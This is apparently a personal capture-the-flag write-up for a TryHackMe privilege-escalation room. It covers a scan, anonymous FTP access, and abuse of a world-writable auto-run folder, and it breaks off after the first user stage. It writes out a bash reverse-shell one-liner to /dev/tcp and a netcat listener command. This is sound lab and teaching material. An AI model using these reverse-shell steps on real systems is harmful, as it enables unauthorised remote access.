---
tags:
  - CTF
  - Writeup
  - THM
---
**Challenge URL: https://tryhackme.com/room/jump

**System Used: Parrot 7.3

**Room Task: Use privilege escalation knowledge to jump from a normal user to root. Your objective is to escalate from anonymous access all the way through:`recon_user → dev_user → monitor_user → ops_user → root`
You’ve discovered a misconfigured internal automation pipeline running on a server. The system processes recon scripts, development backups, monitoring jobs, and deployment tasks across multiple users. Each stage of the pipeline relies too heavily on the previous one. By abusing these trust boundaries, you must move laterally through the system.

**Written By: Spooky

Target IP: 10.144.137.141
VPN Machine: 192.168.133.226

**Solution:**

1) Run NMAP Scan of Target IP
	1) ![[Pasted image 20260719114957.png]]
2) Browse to the website and see what we can find
	1) Nada
3) Try SSH/FTP with Anonymous login
	1) SSH denied
	2) FTP worked
		1) anonymous login accepted
4) Browse files once in FTP
	1) Found README.txt
		1) `get README.txt`
		2) `cat README.txt`
			1) ![[Pasted image 20260719121706.png]]
	2) Check permissions for incoming folder mentioned in readme
		1) `drwxrwxrwx incoming` - full permissions and anything placed inside runs automatically. 
		2) Need to find out what file the `incoming` folder takes
			1) `bash -i >& /dev/tcp/LHOST/4445 0>&1`
			2) `nc lnvp 4445`
			3) ![[Pasted image 20260719130922.png]]
				1) find first flag found
				2) cat `shell.sh` - reverse shell to ???
					1) ![[Pasted image 20260719132149.png]]
	3) Enumerate `recon_user
		1) ![[Pasted image 20260719133456.png]]
		2) Change directory to dev user and find second flag